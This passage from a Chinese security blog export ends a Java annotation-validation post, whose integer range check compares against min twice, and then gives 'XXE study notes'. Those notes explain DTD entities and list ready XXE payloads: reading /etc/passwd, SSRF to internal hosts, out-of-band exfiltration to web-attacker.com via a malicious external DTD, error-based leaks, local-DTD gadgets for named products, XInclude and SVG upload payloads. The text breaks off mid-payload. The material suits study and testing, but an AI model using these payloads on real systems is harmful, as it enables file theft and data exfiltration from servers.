class=\"keyword\">null</span>) &#123;</span><br><span class=\"line\">                Object value = field.get(person);</span><br><span class=\"line\"></span><br><span class=\"line\">                <span class=\"keyword\">if</span> (value <span class=\"keyword\">instanceof</span> String)&#123;</span><br><span class=\"line\">                    <span class=\"keyword\">int</span> value_length = ((String) value).length();</span><br><span class=\"line\">                    System.out.println(<span class=\"string\">&quot;当前filed：&quot;</span>+ field.getName()+ <span class=\"string\">&quot;的长度是&quot;</span>+ ((String) value).length());</span><br><span class=\"line\">                    <span class=\"keyword\">if</span> (value_length &lt; range.min() || value_length &gt; range.max())&#123;</span><br><span class=\"line\">                        <span class=\"keyword\">throw</span> <span class=\"keyword\">new</span> IllegalArgumentException(<span class=\"string\">&quot;Invalid field: &quot;</span> + field.getName());</span><br><span class=\"line\">                    &#125;</span><br><span class=\"line\">                &#125;</span><br><span class=\"line\">                <span class=\"keyword\">if</span> (value <span class=\"keyword\">instanceof</span> Integer)&#123;</span><br><span class=\"line\">                    <span class=\"keyword\">if</span> ((<span class=\"keyword\">int</span>) value &lt; range.min() || (<span class=\"keyword\">int</span>) value &gt; range.min())&#123;</span><br><span class=\"line\">                        <span class=\"keyword\">throw</span> <span class=\"keyword\">new</span> IllegalArgumentException(<span class=\"string\">&quot;Invalid field: &quot;</span> + field.getName());</span><br><span class=\"line\">                    &#125;</span><br><span class=\"line\">                &#125;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br></pre></td></tr></table></figure>\n\n<p>注解定义：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">@Retention(RetentionPolicy.RUNTIME)</span></span><br><span class=\"line\"><span class=\"meta\">@Target(ElementType.FIELD)</span></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"meta\">@interface</span> Range &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">min</span><span class=\"params\">()</span> <span class=\"keyword\">default</span> 0</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">max</span><span class=\"params\">()</span> <span class=\"keyword\">default</span> 255</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">Person</span> </span>&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"meta\">@Range(min = 1, max = 20)</span></span><br><span class=\"line\">    <span class=\"keyword\">public</span> String name;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"meta\">@Range(max = 10)</span></span><br><span class=\"line\">    <span class=\"keyword\">public</span> String city;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"meta\">@Range(min = 1, max = 100)</span></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">int</span> age;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"title\">Person</span><span class=\"params\">(String name, String city, <span class=\"keyword\">int</span> age)</span> </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">this</span>.name = name;</span><br><span class=\"line\">        <span class=\"keyword\">this</span>.city = city;</span><br><span class=\"line\">        <span class=\"keyword\">this</span>.age = age;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"meta\">@Override</span></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> String <span class=\"title\">toString</span><span class=\"params\">()</span> </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> String.format(<span class=\"string\">&quot;&#123;Person: name=%s, city=%s, age=%d&#125;&quot;</span>, name, city, age);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<h1 id=\"参考文档\"><a href=\"#参考文档\" class=\"headerlink\" title=\"参考文档\"></a>参考文档</h1><ol>\n<li><a href=\"https://www.liaoxuefeng.com/wiki/1252599548343744/1255945389098144\">https://www.liaoxuefeng.com/wiki/1252599548343744/1255945389098144</a></li>\n<li><a href=\"https://blog.csdn.net/pan_junbiao/article/details/85249614\">https://blog.csdn.net/pan_junbiao/article/details/85249614</a></li>\n</ol>\n","categories":["WebSec"],"tags":["java安全"]},{"title":"xxe学习笔记","url":"http://blog.le31ei.top/2021/03/09/xxe学习笔记/","content":"<h1 id=\"0x01-DTD基础知识\"><a href=\"#0x01-DTD基础知识\" class=\"headerlink\" title=\"0x01 DTD基础知识\"></a>0x01 DTD基础知识</h1><p><code>DTD</code>全称document type definition，对xml的格式进行规范。DTD可以声明于xml文档中，也可以作为一个外部引用。</p>\n<p><strong>内部DTD声明</strong>：</p>\n<p>基本语法：</p>\n<figure class=\"highlight xml\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;!DOCTYPE <span class=\"meta-keyword\">root-element</span> [element-declarations]&gt;</span></span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight xml\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?xml version=&quot;1.0&quot;?&gt;</span></span><br><span class=\"line\"><span class=\"meta\">&lt;!DOCTYPE <span class=\"meta-keyword\">note</span> [                          // 定义了note类型的文档，也就是根元素为note</span></span><br><span class=\"line\"><span class=\"meta\"><span class=\"meta\">&lt;!ELEMENT <span class=\"meta-keyword\">note</span> (<span class=\"meta-keyword\">to</span>,<span class=\"meta-keyword\">from</span>,<span class=\"meta-keyword\">heading</span>,<span class=\"meta-keyword\">body</span>)&gt;</span>    // 定义了note有四个元素</span></span><br><span class=\"line\"><span class=\"meta\"><span class=\"meta\">&lt;!ELEMENT <span class=\"meta-keyword\">to</span> (<span class=\"meta-keyword\">#PCDATA</span>)&gt;</span>                   // 定义to元素的类型</span></span><br><span class=\"line\"><span class=\"meta\"><span class=\"meta\">&lt;!ELEMENT <span class=\"meta-keyword\">from</span> (<span class=\"meta-keyword\">#PCDATA</span>)&gt;</span>                 // 定义from元素的类型</span></span><br><span class=\"line\"><span class=\"meta\"><span class=\"meta\">&lt;!ELEMENT <span class=\"meta-keyword\">heading</span> (<span class=\"meta-keyword\">#PCDATA</span>)&gt;</span>              //定义heading元素的类型</span></span><br><span class=\"line\"><span class=\"meta\"><span class=\"meta\">&lt;!ELEMENT <span class=\"meta-keyword\">body</span> (<span class=\"meta-keyword\">#PCDATA</span>)&gt;</span>                 //定义body元素的类型</span></span><br><span class=\"line\"><span class=\"meta\">]&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">note</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">to</span>&gt;</span>Tove<span class=\"tag\">&lt;/<span class=\"name\">to</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">from</span>&gt;</span>Jani<span class=\"tag\">&lt;/<span class=\"name\">from</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">heading</span>&gt;</span>Reminder<span class=\"tag\">&lt;/<span class=\"name\">heading</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">body</span>&gt;</span>Don&#x27;t forget me this weekend<span class=\"tag\">&lt;/<span class=\"name\">body</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">note</span>&gt;</span></span><br></pre></td></tr></table></figure>\n\n<p><strong>外部DTD声明</strong></p>\n<p>基本语法：</p>\n<figure class=\"highlight xml\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;!DOCTYPE <span class=\"meta-keyword\">root-element</span> <span class=\"meta-keyword\">SYSTEM</span> <span class=\"meta-string\">&quot;filename&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure>\n\n<p>示例：</p>\n<figure class=\"highlight xml\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?xml version=&quot;1.0&quot;?&gt;</span></span><br><span class=\"line\"><span class=\"meta\">&lt;!DOCTYPE <span class=\"meta-keyword\">note</span> <span class=\"meta-keyword\">SYSTEM</span> <span class=\"meta-string\">&quot;note.dtd&quot;</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">note</span>&gt;</span></span><br><span class=\"line\">  <span class=\"tag\">&lt;<span class=\"name\">to</span>&gt;</span>Tove<span class=\"tag\">&lt;/<span class=\"name\">to</span>&gt;</span></span><br><span class=\"line\">  <span class=\"tag\">&lt;<span class=\"name\">from</span>&gt;</span>Jani<span class=\"tag\">&lt;/<span class=\"name\">from</span>&gt;</span></span><br><span class=\"line\">  <span class=\"tag\">&lt;<span class=\"name\">heading</span>&gt;</span>Reminder<span class=\"tag\">&lt;/<span class=\"name\">heading</span>&gt;</span></span><br><span class=\"line\">  <span class=\"tag\">&lt;<span class=\"name\">body</span>&gt;</span>Don&#x27;t forget me this weekend!<span class=\"tag\">&lt;/<span class=\"name\">body</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">note</span>&gt;</span></span><br></pre></td></tr></table></figure>\n\n<p>note.dtd文件</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;!ELEMENT note (to,from,heading,body)&gt;</span><br><span class=\"line\">&lt;!ELEMENT to (#PCDATA)&gt;</span><br><span class=\"line\">&lt;!ELEMENT from (#PCDATA)&gt;</span><br><span class=\"line\">&lt;!ELEMENT heading (#PCDATA)&gt;</span><br><span class=\"line\">&lt;!ELEMENT body (#PCDATA)&gt;</span><br></pre></td></tr></table></figure>\n\n<p><strong>PCDATA</strong></p>\n<p>被解析的字符数据，表示该元素的类型是字符串类型，但是特殊字符会被实体化编码，例如：<code>&amp;</code>、<code>&lt;</code>、<code>&gt;</code>会被替换为<code>&amp;amp;</code>、<code>&amp;lt</code>、<code>&amp;gt</code>、。</p>\n<p><strong>CDATA</strong></p>\n<p>不会被解释器解析的文本，所有的标签会原封不动的展示出来。</p>\n<p><strong>DTD实体</strong></p>\n<p>内部实体：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;!ENTITY entity-name &quot;entity-value&quot;&gt;</span><br><span class=\"line\">&lt;!ENTITY writer &quot;Donald Duck.&quot;&gt;</span><br><span class=\"line\">&lt;!ENTITY copyright &quot;Copyright runoob.com&quot;&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">&#x2F;&#x2F;引用实体</span><br><span class=\"line\">&lt;author&gt;&amp;writer;&amp;copyright;&lt;&#x2F;author&gt;</span><br></pre></td></tr></table></figure>\n\n<p>外部实体：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;!ENTITY entity-name SYSTEM &quot;URI&#x2F;URL&quot;&gt;</span><br><span class=\"line\">&lt;!ENTITY writer SYSTEM &quot;http:&#x2F;&#x2F;xxx.com&#x2F;entities.dtd&quot;&gt;</span><br><span class=\"line\">&lt;!ENTITY copyright SYSTEM &quot;http:&#x2F;&#x2F;xxx&#x2F;entities.dtd&quot;&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">&#x2F;&#x2F;引用实体</span><br><span class=\"line\">&lt;author&gt;&amp;writer;&amp;copyright;&lt;&#x2F;author&gt;</span><br></pre></td></tr></table></figure>\n\n<p><strong>通用实体与参数实体</strong></p>\n<p>通用实体指的是直接引用的实体，用&amp;开头命名，参数实体指的是在DTD中定义的其他通用实体</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;utf-8&quot;?&gt; </span><br><span class=\"line\">&lt;!DOCTYPE updateProfile [&lt;!ENTITY file SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;c:&#x2F;windows&#x2F;win.ini&quot;&gt; ]&gt; </span><br><span class=\"line\">&lt;updateProfile&gt;  </span><br><span class=\"line\">    &lt;firstname&gt;Joe&lt;&#x2F;firstname&gt;  </span><br><span class=\"line\">    &lt;lastname&gt;&amp;file;&lt;&#x2F;lastname&gt;  &#x2F;&#x2F; 通用实体，直接使用&amp;进行引用</span><br><span class=\"line\">    ... </span><br><span class=\"line\">&lt;&#x2F;updateProfile&gt;</span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;!ENTITY % an-element &quot;&lt;!ELEMENT mytag (subtag)&gt;&quot;&gt; </span><br><span class=\"line\">&lt;!ENTITY % remote-dtd SYSTEM &quot;http:&#x2F;&#x2F;xxx.com&#x2F;remote.dtd&quot;&gt; </span><br><span class=\"line\">%an-element; %remote-dtd;    &#x2F;&#x2F;参数实体，引用参数来定义通用实体</span><br></pre></td></tr></table></figure>\n\n<h1 id=\"0x02-XXE利用方式\"><a href=\"#0x02-XXE利用方式\" class=\"headerlink\" title=\"0x02 XXE利用方式\"></a>0x02 XXE利用方式</h1><h2 id=\"1-读文件\"><a href=\"#1-读文件\" class=\"headerlink\" title=\"1. 读文件\"></a>1. 读文件</h2><p>一般有回显的情况下可以直接读取文件</p>\n<figure class=\"highlight xml\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span></span><br><span class=\"line\"><span class=\"meta\">&lt;!DOCTYPE <span class=\"meta-keyword\">foo</span> [ <span class=\"meta\">&lt;!ENTITY <span class=\"meta-keyword\">xxe</span> <span class=\"meta-keyword\">SYSTEM</span> <span class=\"meta-string\">&quot;file:///etc/passwd&quot;</span>&gt;</span> ]&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">stockCheck</span>&gt;</span></span><br><span class=\"line\">  <span class=\"tag\">&lt;<span class=\"name\">productId</span>&gt;</span><span class=\"symbol\">&amp;xxe;</span><span class=\"tag\">&lt;/<span class=\"name\">productId</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">stockCheck</span>&gt;</span></span><br></pre></td></tr></table></figure>\n\n\n\n<h2 id=\"2-ssrf\"><a href=\"#2-ssrf\" class=\"headerlink\" title=\"2. ssrf\"></a>2. ssrf</h2><p>无回显的时候，可以通过错误的返回来进行ssrf攻击</p>\n<figure class=\"highlight xml\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;!DOCTYPE <span class=\"meta-keyword\">foo</span> [ </span></span><br><span class=\"line\"><span class=\"meta\"><span class=\"meta\">&lt;!ENTITY <span class=\"meta-keyword\">xxe</span> <span class=\"meta-keyword\">SYSTEM</span> <span class=\"meta-string\">&quot;http://internal.vulnerable-website.com/&quot;</span>&gt;</span> </span></span><br><span class=\"line\"><span class=\"meta\">]&gt;</span></span><br></pre></td></tr></table></figure>\n\n<p>各种语言支持的协议如下图：</p>\n<p><img src=\"/2021/03/09/xxe%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/20181120002647-e93bbf00-ec17-1.png\" alt=\"img\"></p>\n<h2 id=\"3-oob\"><a href=\"#3-oob\" class=\"headerlink\" title=\"3. oob\"></a>3. oob</h2><p><strong>数据带外</strong></p>\n<p>外部加载的DTD文件，作用是让程序读取/etc/passwd然后发送到外部服务器，引号中的%需要编码成<code>&amp;#x25</code></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;!ENTITY % file SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;etc&#x2F;passwd&quot;&gt;</span><br><span class=\"line\">&lt;!ENTITY % eval &quot;&lt;!ENTITY &amp;#x25; exfiltrate SYSTEM &#39;http:&#x2F;&#x2F;web-attacker.com&#x2F;?x&#x3D;%file;&#39;&gt;&quot;&gt;</span><br><span class=\"line\">%eval;</span><br><span class=\"line\">%exfiltrate; </span><br></pre></td></tr></table></figure>\n\n<p>将以上文件放到受控的服务器：<code>http://web-attacker.com/malicious.dtd</code></p>\n<p>然后对目标发送如下payload:</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;!DOCTYPE foo [&lt;!ENTITY % xxe SYSTEM</span><br><span class=\"line\">&quot;http:&#x2F;&#x2F;web-attacker.com&#x2F;malicious.dtd&quot;&gt; %xxe;]&gt;</span><br></pre></td></tr></table></figure>\n\n<p>对于很多文件中存在换行符的情况，以上则无法进行处理。</p>\n<p>针对php可以采用伪协议进行base64编码发送</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;!ENTITY % file SYSTEM &quot;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;&#x2F;etc&#x2F;passwd&quot;&gt;</span><br><span class=\"line\">&lt;!ENTITY % eval &quot;&lt;!ENTITY &amp;#x25; exfiltrate SYSTEM &#39;http:&#x2F;&#x2F;web-attacker.com&#x2F;?x&#x3D;%file;&#39;&gt;&quot;&gt;</span><br><span class=\"line\">%eval;</span><br><span class=\"line\">%exfiltrate; </span><br></pre></td></tr></table></figure>\n\n<p><strong>如果碰到数据带不出来，但有报错的情况，可以使用如下payload，读取不存在的文件，通过报错来回显数据</strong></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;!ENTITY % file SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;etc&#x2F;passwd&quot;&gt;</span><br><span class=\"line\">&lt;!ENTITY % eval &quot;&lt;!ENTITY &amp;#x25; error SYSTEM &#39;file:&#x2F;&#x2F;&#x2F;nonexistent&#x2F;%file;&#39;&gt;&quot;&gt;</span><br><span class=\"line\">%eval;</span><br><span class=\"line\">%error;</span><br></pre></td></tr></table></figure>\n\n<p><strong>如果防火墙对加载外部dtd有防护的话，则可以采用<a href=\"https://portswigger.net/web-security/xxe/blind\">https://portswigger.net/web-security/xxe/blind</a>这里所写的办法</strong></p>\n<p>加载一个本地的dtd文件，然后覆盖文件内的节点，通过报错来直接回显数据</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;!DOCTYPE foo [</span><br><span class=\"line\">&lt;!ENTITY % local_dtd SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;usr&#x2F;local&#x2F;app&#x2F;schema.dtd&quot;&gt;</span><br><span class=\"line\">&lt;!ENTITY % custom_entity &#39;</span><br><span class=\"line\">&lt;!ENTITY &amp;#x25; file SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;etc&#x2F;passwd&quot;&gt;</span><br><span class=\"line\">&lt;!ENTITY &amp;#x25; eval &quot;&lt;!ENTITY &amp;#x26;#x25; error SYSTEM &amp;#x27;file:&#x2F;&#x2F;&#x2F;nonexistent&#x2F;&amp;#x25;file;&amp;#x27;&gt;&quot;&gt;</span><br><span class=\"line\">&amp;#x25;eval;</span><br><span class=\"line\">&amp;#x25;error;</span><br><span class=\"line\">&#39;&gt;</span><br><span class=\"line\">%local_dtd;</span><br><span class=\"line\">]&gt;</span><br></pre></td></tr></table></figure>\n\n<p>里面的<code>custom_entity</code>实体需要包含在<code>schema.dtd</code>中</p>\n<p>针对不同的系统，可以有如下已经存在的dtd文件:</p>\n<p><strong>linux gnome桌面</strong></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;!ENTITY % local_dtd SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;usr&#x2F;share&#x2F;yelp&#x2F;dtd&#x2F;docbookx.dtd&quot;&gt;</span><br><span class=\"line\">&lt;!ENTITY % ISOamsa &#39;Your DTD code&#39;&gt;</span><br><span class=\"line\">%local_dtd;</span><br></pre></td></tr></table></figure>\n\n<p><strong>windows</strong></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;!ENTITY % local_dtd SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;C:\\Windows\\System32\\wbem\\xml\\cim20.dtd&quot;&gt;</span><br><span class=\"line\">&lt;!ENTITY % SuperClass &#39;&gt;Your DTD code&lt;!ENTITY test &quot;test&quot;&#39;&gt;</span><br><span class=\"line\">%local_dtd;</span><br></pre></td></tr></table></figure>\n\n<p><strong>Cisco WebEx</strong></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;!ENTITY % local_dtd SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;usr&#x2F;share&#x2F;xml&#x2F;scrollkeeper&#x2F;dtds&#x2F;scrollkeeper-omf.dtd&quot;&gt;</span><br><span class=\"line\">&lt;!ENTITY % url.attribute.set &#39;&gt;Your DTD code&lt;!ENTITY test &quot;test&quot;&#39;&gt;</span><br><span class=\"line\">%local_dtd;</span><br></pre></td></tr></table></figure>\n\n<p><strong>Citrix XenMobile Server</strong></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;!ENTITY % local_dtd SYSTEM &quot;jar:file:&#x2F;&#x2F;&#x2F;opt&#x2F;sas&#x2F;sw&#x2F;tomcat&#x2F;shared&#x2F;lib&#x2F;jsp-api.jar!&#x2F;javax&#x2F;servlet&#x2F;jsp&#x2F;resources&#x2F;jspxml.dtd&quot;&gt;</span><br><span class=\"line\">&lt;!ENTITY % Body &#39;&gt;Your DTD code&lt;!ENTITY test &quot;test&quot;&#39;&gt;</span><br><span class=\"line\">%local_dtd;</span><br></pre></td></tr></table></figure>\n\n<p><strong>Custom Multi-Platform IBM WebSphere Application</strong></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;!ENTITY % local_dtd SYSTEM &quot;.&#x2F;..&#x2F;..&#x2F;properties&#x2F;schemas&#x2F;j2ee&#x2F;XMLSchema.dtd&quot;&gt;</span><br><span class=\"line\">&lt;!ENTITY % xs-datatypes &#39;Your DTD code&#39;&gt;</span><br><span class=\"line\">&lt;!ENTITY % simpleType &quot;a&quot;&gt;</span><br><span class=\"line\">&lt;!ENTITY % restriction &quot;b&quot;&gt;</span><br><span class=\"line\">&lt;!ENTITY % boolean &quot;(c)&quot;&gt;</span><br><span class=\"line\">&lt;!ENTITY % URIref &quot;CDATA&quot;&gt;</span><br><span class=\"line\">&lt;!ENTITY % XPathExpr &quot;CDATA&quot;&gt;</span><br><span class=\"line\">&lt;!ENTITY % QName &quot;NMTOKEN&quot;&gt;</span><br><span class=\"line\">&lt;!ENTITY % NCName &quot;NMTOKEN&quot;&gt;</span><br><span class=\"line\">&lt;!ENTITY % nonNegativeInteger &quot;NMTOKEN&quot;&gt;</span><br><span class=\"line\">%local_dtd;</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"4-soap接口攻击\"><a href=\"#4-soap接口攻击\" class=\"headerlink\" title=\"4. soap接口攻击\"></a>4. soap接口攻击</h2><p>在前端获取到参数后，后端接口直接放入xml中，对后台的soap接口进行请求。这种情况需要挨着测试参数，添加如下payload</p>\n<figure class=\"highlight xml\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">foo</span> <span class=\"attr\">xmlns:xi</span>=<span class=\"string\">&quot;http://www.w3.org/2001/XInclude&quot;</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">xi:include</span> <span class=\"attr\">parse</span>=<span class=\"string\">&quot;text&quot;</span> <span class=\"attr\">href</span>=<span class=\"string\">&quot;file:///etc/passwd&quot;</span>/&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">foo</span>&gt;</span></span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/2021/03/09/xxe%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20210309123241787.png\" alt=\"image-20210309123241787\"></p>\n<h2 id=\"5-svg上传\"><a href=\"#5-svg上传\" class=\"headerlink\" title=\"5. svg上传\"></a>5. svg上传</h2><figure class=\"highlight xml\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?xml version=&quot;1.0&quot; standalone=&quot;yes&quot;?&gt;</span><span class=\"meta\">&lt;!DOCTYPE <span class=\"meta-keyword\">test</span> [ <span class=\"meta\">&lt;!ENTITY <span class=\"meta-keyword\">xxe</span> <span class=\"meta-keyword\">SYSTEM</span> <span class=\"meta-string\">&quot;file:///etc/hostname&quot;</span> &gt;</span> ]&gt;</span><span class=\"tag\">&lt;<span class=\"name\">svg</span> <span class=\"attr\">width</span>=<span 